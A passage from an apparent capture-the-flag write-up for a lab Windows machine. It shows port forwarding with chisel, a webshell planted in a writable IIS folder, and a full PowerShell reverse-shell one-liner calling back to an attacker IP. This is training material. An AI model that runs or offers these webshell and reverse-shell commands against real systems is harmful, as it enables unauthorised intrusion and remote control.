</span><span id="__span-93-15"><a id="__codelineno-93-15" name="__codelineno-93-15" href="#__codelineno-93-15"></a>                Log directory: C:\inetpub\logs\LogFiles\W3SVC1
</span><span id="__span-93-16"><a id="__codelineno-93-16" name="__codelineno-93-16" href="#__codelineno-93-16"></a>                Log format: 0
</span><span id="__span-93-17"><a id="__codelineno-93-17" name="__codelineno-93-17" href="#__codelineno-93-17"></a>            Authentication Configuration:
</span><span id="__span-93-18"><a id="__codelineno-93-18" name="__codelineno-93-18" href="#__codelineno-93-18"></a>                Authentication schemes enabled:
</span><span id="__span-93-19"><a id="__codelineno-93-19" name="__codelineno-93-19" href="#__codelineno-93-19"></a>            Number of registered URLs: 1
</span><span id="__span-93-20"><a id="__codelineno-93-20" name="__codelineno-93-20" href="#__codelineno-93-20"></a>            Registered URLs:
</span><span id="__span-93-21"><a id="__codelineno-93-21" name="__codelineno-93-21" href="#__codelineno-93-21"></a>                HTTP://127.0.0.1:8000:127.0.0.1/
</span></code></pre></div>
<p>So as seen above, the associated port is <code>8000</code></p>
<p>I then automated the process for future reference, using my custom powershell script to identify IIS presence with associated port:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>.<span class="se">\l</span>istenports.ps1
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Collecting<span class="w"> </span>IIS<span class="w"> </span>servicestate...
</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>IIS-registered<span class="w"> </span>ports<span class="w"> </span>found:
</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>
</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>Port<span class="w">    </span>URL<span class="w">                              </span>AppPool<span class="w">       </span>
</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>----<span class="w">    </span>---<span class="w">                              </span>-------<span class="w">       </span>
</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a>unknown<span class="w"> </span>HTTP://127.0.0.1:8000:127.0.0.1/<span class="w"> </span>DefaultAppPool
</span></code></pre></div>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n</span><span class="s2">[+] Collecting IIS servicestate...&quot;</span>
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a><span class="nv">$servicestate</span> <span class="p">=</span> <span class="n">netsh</span> <span class="n">http</span> <span class="n">show</span> <span class="n">servicestate</span>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>
</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a><span class="nv">$results</span> <span class="p">=</span> <span class="p">@()</span>
</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a><span class="nv">$currentQueue</span> <span class="p">=</span> <span class="nv">$null</span>
</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a>
</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a><span class="k">foreach</span> <span class="p">(</span><span class="nv">$line</span> <span class="k">in</span> <span class="nv">$servicestate</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a>    <span class="k">if</span> <span class="p">(</span><span class="nv">$line</span> <span class="o">-match</span> <span class="s2">&quot;Request queue name:\s+(.*)&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-95-9"><a id="__codelineno-95-9" name="__codelineno-95-9" href="#__codelineno-95-9"></a>        <span class="nv">$currentQueue</span> <span class="p">=</span> <span class="nv">$Matches</span><span class="p">[</span><span class="n">1</span><span class="p">]</span>
</span><span id="__span-95-10"><a id="__codelineno-95-10" name="__codelineno-95-10" href="#__codelineno-95-10"></a>    <span class="p">}</span>
</span><span id="__span-95-11"><a id="__codelineno-95-11" name="__codelineno-95-11" href="#__codelineno-95-11"></a>    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$line</span> <span class="o">-match</span> <span class="s2">&quot;^\s*HTTP&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-95-12"><a id="__codelineno-95-12" name="__codelineno-95-12" href="#__codelineno-95-12"></a>        <span class="c"># Skip unnamed queues (non-IIS)</span>
</span><span id="__span-95-13"><a id="__codelineno-95-13" name="__codelineno-95-13" href="#__codelineno-95-13"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$currentQueue</span> <span class="o">-eq</span> <span class="s2">&quot;Request queue is unnamed.&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">continue</span> <span class="p">}</span>
</span><span id="__span-95-14"><a id="__codelineno-95-14" name="__codelineno-95-14" href="#__codelineno-95-14"></a>
</span><span id="__span-95-15"><a id="__codelineno-95-15" name="__codelineno-95-15" href="#__codelineno-95-15"></a>        <span class="nv">$url</span> <span class="p">=</span> <span class="nv">$line</span><span class="p">.</span><span class="n">Trim</span><span class="p">()</span>
</span><span id="__span-95-16"><a id="__codelineno-95-16" name="__codelineno-95-16" href="#__codelineno-95-16"></a>        <span class="c"># Extract port number from URL (after last :)</span>
</span><span id="__span-95-17"><a id="__codelineno-95-17" name="__codelineno-95-17" href="#__codelineno-95-17"></a>        <span class="k">if</span> <span class="p">(</span><span class="nv">$url</span> <span class="o">-match</span> <span class="s2">&quot;:(\d+)/&quot;</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-95-18"><a id="__codelineno-95-18" name="__codelineno-95-18" href="#__codelineno-95-18"></a>            <span class="nv">$port</span> <span class="p">=</span> <span class="nv">$Matches</span><span class="p">[</span><span class="n">1</span><span class="p">]</span>
</span><span id="__span-95-19"><a id="__codelineno-95-19" name="__codelineno-95-19" href="#__codelineno-95-19"></a>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-95-20"><a id="__codelineno-95-20" name="__codelineno-95-20" href="#__codelineno-95-20"></a>            <span class="nv">$port</span> <span class="p">=</span> <span class="s2">&quot;unknown&quot;</span>
</span><span id="__span-95-21"><a id="__codelineno-95-21" name="__codelineno-95-21" href="#__codelineno-95-21"></a>        <span class="p">}</span>
</span><span id="__span-95-22"><a id="__codelineno-95-22" name="__codelineno-95-22" href="#__codelineno-95-22"></a>        <span class="nv">$results</span> <span class="p">+=</span> <span class="no">[PSCustomObject]</span><span class="p">@{</span>
</span><span id="__span-95-23"><a id="__codelineno-95-23" name="__codelineno-95-23" href="#__codelineno-95-23"></a>            <span class="n">Port</span>    <span class="p">=</span> <span class="nv">$port</span>
</span><span id="__span-95-24"><a id="__codelineno-95-24" name="__codelineno-95-24" href="#__codelineno-95-24"></a>            <span class="n">URL</span>     <span class="p">=</span> <span class="nv">$url</span>
</span><span id="__span-95-25"><a id="__codelineno-95-25" name="__codelineno-95-25" href="#__codelineno-95-25"></a>            <span class="n">AppPool</span> <span class="p">=</span> <span class="nv">$currentQueue</span>
</span><span id="__span-95-26"><a id="__codelineno-95-26" name="__codelineno-95-26" href="#__codelineno-95-26"></a>        <span class="p">}</span>
</span><span id="__span-95-27"><a id="__codelineno-95-27" name="__codelineno-95-27" href="#__codelineno-95-27"></a>    <span class="p">}</span>
</span><span id="__span-95-28"><a id="__codelineno-95-28" name="__codelineno-95-28" href="#__codelineno-95-28"></a><span class="p">}</span>
</span><span id="__span-95-29"><a id="__codelineno-95-29" name="__codelineno-95-29" href="#__codelineno-95-29"></a>
</span><span id="__span-95-30"><a id="__codelineno-95-30" name="__codelineno-95-30" href="#__codelineno-95-30"></a><span class="k">if</span> <span class="p">(</span><span class="nv">$results</span><span class="p">)</span> <span class="p">{</span>
</span><span id="__span-95-31"><a id="__codelineno-95-31" name="__codelineno-95-31" href="#__codelineno-95-31"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;[+] IIS-registered ports found:</span><span class="se">`n</span><span class="s2">&quot;</span>
</span><span id="__span-95-32"><a id="__codelineno-95-32" name="__codelineno-95-32" href="#__codelineno-95-32"></a>    <span class="nv">$results</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">Port</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
</span><span id="__span-95-33"><a id="__codelineno-95-33" name="__codelineno-95-33" href="#__codelineno-95-33"></a><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span id="__span-95-34"><a id="__codelineno-95-34" name="__codelineno-95-34" href="#__codelineno-95-34"></a>    <span class="nb">Write-Host</span> <span class="s2">&quot;[!] No IIS ports found in servicestate.&quot;</span>
</span><span id="__span-95-35"><a id="__codelineno-95-35" name="__codelineno-95-35" href="#__codelineno-95-35"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="port-forwarding">Port forwarding</h2>
<p>Since we have found earlier that port <code>8000</code> was bound to an IIS server, lets port forward towards our attacker machine to get access to it</p>
<h3 id="using-chisel">Using chisel</h3>
<ul>
<li>Download chisel</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>wget<span class="w"> </span>https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
</span></code></pre></div>
<ul>
<li>then run local server for transferring</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>python<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">800</span>
</span></code></pre></div>
<ul>
<li>on target host retrieve the executable</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>powershell<span class="w"> </span>-c<span class="w"> </span>wget<span class="w"> </span><span class="m">10</span>.10.14.180:800/chisel.exe<span class="w"> </span>-outfile<span class="w"> </span>chisel.exe
</span></code></pre></div>
<ul>
<li>on attacker machine:</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>chisel<span class="w"> </span>server<span class="w"> </span>-p<span class="w"> </span><span class="m">8000</span><span class="w"> </span>--reverse
</span></code></pre></div>
<ul>
<li>inside the target host:</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>.<span class="se">\c</span>hisel.exe<span class="w"> </span>client<span class="w"> </span><span class="m">10</span>.10.14.180:8000<span class="w"> </span>R:8001:127.0.0.1:8000
</span></code></pre></div>
<p>The screenshot below shows that the port forwarding was successful:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image16.png" /></p>
<p>Next visit <a href="http://127.0.0.1:8001/"><code>http://127.0.0.1:8001</code></a> , and there is the webpage:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image17.png" /></p>
<h2 id="banner-grabbing_2">Banner grabbing</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>whatweb<span class="w"> </span><span class="m">127</span>.0.0.1:8001
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>http://127.0.0.1:8001<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Bootstrap,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>Frame,<span class="w"> </span>Google-API<span class="o">[</span>ajax/libs/jquery/1.10.2/jquery.min.js<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Microsoft-IIS/10.0<span class="o">]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span>,<span class="w"> </span>JQuery<span class="o">[</span><span class="m">1</span>.10.2,1.11.2<span class="o">]</span>,<span class="w"> </span>Microsoft-IIS<span class="o">[</span><span class="m">10</span>.0<span class="o">]</span>,<span class="w"> </span>Modernizr<span class="o">[</span><span class="m">2</span>.8.3-respond-1.4.2.min<span class="o">]</span>,<span class="w"> </span>Script<span class="o">[</span>text/javascript<span class="o">]</span>,<span class="w"> </span>Title<span class="o">[</span>Flight<span class="w"> </span>-<span class="w"> </span>Travel<span class="w"> </span>and<span class="w"> </span>Tour<span class="o">]</span>,<span class="w"> </span>X-Powered-By<span class="o">[</span>ASP.NET<span class="o">]</span>,<span class="w"> </span>X-UA-Compatible<span class="o">[</span><span class="nv">IE</span><span class="o">=</span>edge<span class="o">]</span>,<span class="w"> </span>YouTube
</span></code></pre></div>
<p>As indicated earlier on from our investigation, its an <code>IIS server</code> (Microsoft-IIS[10.0]) , but how can we move forward????</p>
<h2 id="understanding-the-iis-server">Understanding the IIS server</h2>
<p>With little research i found that the <strong>Default IIS Web Site root folder is:</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>C:\inetpub\wwwroot
</span></code></pre></div>
<p>so lets hop in the shell we had earlier as C.Bum and navigate towards the above dir</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>Directory<span class="w"> </span>of<span class="w"> </span>C:<span class="se">\i</span>netpub
</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>
</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:00<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>.
</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:00<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>..
</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:24<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>custerr
</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:01<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>development
</span><span id="__span-104-7"><a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">01</span>:08<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span><span class="nb">history</span>
</span><span id="__span-104-8"><a id="__codelineno-104-8" name="__codelineno-104-8" href="#__codelineno-104-8"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:32<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>logs
</span><span id="__span-104-9"><a id="__codelineno-104-9" name="__codelineno-104-9" href="#__codelineno-104-9"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:24<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>temp
</span><span id="__span-104-10"><a id="__codelineno-104-10" name="__codelineno-104-10" href="#__codelineno-104-10"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:28<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>wwwroot
</span><span id="__span-104-11"><a id="__codelineno-104-11" name="__codelineno-104-11" href="#__codelineno-104-11"></a><span class="w">               </span><span class="m">0</span><span class="w"> </span>File<span class="o">(</span>s<span class="o">)</span><span class="w">              </span><span class="m">0</span><span class="w"> </span>bytes
</span><span id="__span-104-12"><a id="__codelineno-104-12" name="__codelineno-104-12" href="#__codelineno-104-12"></a><span class="w">               </span><span class="m">8</span><span class="w"> </span>Dir<span class="o">(</span>s<span class="o">)</span><span class="w">   </span><span class="m">4</span>,088,504,320<span class="w"> </span>bytes<span class="w"> </span>free
</span></code></pre></div>
<h3 id="webpage-content-directory">Webpage content directory</h3>
<p>Lets find where the content is located:</p>
<p><code>wwwroot</code> Directory</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>Directory<span class="w"> </span>of<span class="w"> </span>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot
</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>
</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:28<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>.
</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:28<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>..
</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#__codelineno-105-5"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:28<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>aspnet_client
</span><span id="__span-105-6"><a id="__codelineno-105-6" name="__codelineno-105-6" href="#__codelineno-105-6"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:24<span class="w"> </span>PM<span class="w">               </span><span class="m">703</span><span class="w"> </span>iisstart.htm
</span><span id="__span-105-7"><a id="__codelineno-105-7" name="__codelineno-105-7" href="#__codelineno-105-7"></a><span class="m">09</span>/22/2022<span class="w">  </span><span class="m">12</span>:24<span class="w"> </span>PM<span class="w">            </span><span class="m">99</span>,710<span class="w"> </span>iisstart.png
</span><span id="__span-105-8"><a id="__codelineno-105-8" name="__codelineno-105-8" href="#__codelineno-105-8"></a><span class="w">               </span><span class="m">2</span><span class="w"> </span>File<span class="o">(</span>s<span class="o">)</span><span class="w">        </span><span class="m">100</span>,413<span class="w"> </span>bytes
</span><span id="__span-105-9"><a id="__codelineno-105-9" name="__codelineno-105-9" href="#__codelineno-105-9"></a><span class="w">               </span><span class="m">3</span><span class="w"> </span>Dir<span class="o">(</span>s<span class="o">)</span><span class="w">   </span><span class="m">4</span>,088,504,320<span class="w"> </span>bytes<span class="w"> </span>free
</span></code></pre></div>
<p>this dir does not contain the contents</p>
<p><code>development</code> Directory </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>Directory<span class="w"> </span>of<span class="w"> </span>C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment
</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>
</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:12<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>.
</span><span id="__span-106-4"><a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:12<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>..
</span><span id="__span-106-5"><a id="__codelineno-106-5" name="__codelineno-106-5" href="#__codelineno-106-5"></a><span class="m">04</span>/16/2018<span class="w">  </span><span class="m">02</span>:23<span class="w"> </span>PM<span class="w">             </span><span class="m">9</span>,371<span class="w"> </span>contact.html
</span><span id="__span-106-6"><a id="__codelineno-106-6" name="__codelineno-106-6" href="#__codelineno-106-6"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:11<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>css
</span><span id="__span-106-7"><a id="__codelineno-106-7" name="__codelineno-106-7" href="#__codelineno-106-7"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:12<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>fonts
</span><span id="__span-106-8"><a id="__codelineno-106-8" name="__codelineno-106-8" href="#__codelineno-106-8"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:12<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>img
</span><span id="__span-106-9"><a id="__codelineno-106-9" name="__codelineno-106-9" href="#__codelineno-106-9"></a><span class="m">04</span>/16/2018<span class="w">  </span><span class="m">02</span>:23<span class="w"> </span>PM<span class="w">            </span><span class="m">45</span>,949<span class="w"> </span>index.html
</span><span id="__span-106-10"><a id="__codelineno-106-10" name="__codelineno-106-10" href="#__codelineno-106-10"></a><span class="m">08</span>/23/2025<span class="w">  </span><span class="m">04</span>:12<span class="w"> </span>PM<span class="w">    </span>&lt;DIR&gt;<span class="w">          </span>js
</span><span id="__span-106-11"><a id="__codelineno-106-11" name="__codelineno-106-11" href="#__codelineno-106-11"></a><span class="w">               </span><span class="m">2</span><span class="w"> </span>File<span class="o">(</span>s<span class="o">)</span><span class="w">         </span><span class="m">55</span>,320<span class="w"> </span>bytes
</span><span id="__span-106-12"><a id="__codelineno-106-12" name="__codelineno-106-12" href="#__codelineno-106-12"></a><span class="w">               </span><span class="m">6</span><span class="w"> </span>Dir<span class="o">(</span>s<span class="o">)</span><span class="w">   </span><span class="m">4</span>,020,420,608<span class="w"> </span>bytes<span class="w"> </span>free
</span></code></pre></div>
<p>This does contain the webpage content, so <strong>whatever we upload on this directory will be accessible from the browser.</strong></p>
<p><strong>But what user has permissions to upload there??</strong></p>
<p>Lets get back to the shell we had as <code>svc_apache</code>, since its an IIS server we wanna see which user has write permissions on the <code>development</code> directory, and <strong>it seems that user C.Bum has write permissions</strong>! (indicated by the W in parenthesis on the 2nd line below)</p>
<p><img alt="image.png" src="../MediaFiles/flight_image18.png" /></p>
<p>Next, what if we follow the same approach like we did for getting shell as svc_apache? </p>
<p>Since we have write permissions on the development directory, lets try uploading the php shell we used for svc_apache:</p>
<h2 id="uploading-webshell-on-the-iis-server">Uploading webshell on the IIS server</h2>
<p>retrieve the file inside the target:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>powershell<span class="w"> </span>-c<span class="w"> </span>wget<span class="w"> </span><span class="m">10</span>.10.14.180:800/rev5.php<span class="w"> </span>-outfile<span class="w"> </span>rev5.php
</span></code></pre></div>
<p>hm tried to upload it but its not found when navigating to it:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image19.png" /></p>
<p>Why didnt this work? Well i later discovered that <strong>PHP is not native to IIS</strong> and By default, IIS is set up to run <strong>ASP.NET applications</strong>.</p>
<p>Well since php wont work, lets try other languange, and specifically the one thats native to IIS, so <code>aspx</code> shell, i used this:</p>
<p>https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx</p>
<p>retrieve the file inside the target:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>powershell<span class="w"> </span>-c<span class="w"> </span>wget<span class="w"> </span><span class="m">10</span>.10.14.180:800/cmd.aspx<span class="w"> </span>-outfile<span class="w"> </span>cmd.aspx
</span></code></pre></div>
<p>this works! By default these values are filled, lets input the command we want:</p>
<p><img alt="image.png" src="../MediaFiles/flight_image20.png" /></p>
<p>I will use this command:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>powershell<span class="w"> </span>-nop<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.180&#39;,9005);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()&quot;</span>
</span></code></pre></div>
<p>but first, we need to find the path, lets get on C.Bum shell and check where is the powershell located:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>C:<span class="se">\i</span>netpub<span class="se">\d</span>evelopment&gt;where<span class="w"> </span>powershell
</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>where<span class="w"> </span>powershell
</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe
</span></code></pre></div>
<p>okay inside the fields of the webshell we paste the following:</p>
<ul>
<li>Program</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\W</span>indowsPowerShell<span class="se">\v</span><span class="m">1</span>.0<span class="se">\p</span>owershell.exe
</span></code></pre></div>
<ul>
<li>Arguments: (the rest of the command)</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>-nop<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.180&#39;,9005);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()&quot;</span>
</span></code></pre></div>
<p>→ got shell</p>
<p><img alt="image.png" src="../MediaFiles/flight_image21.png" /></p>
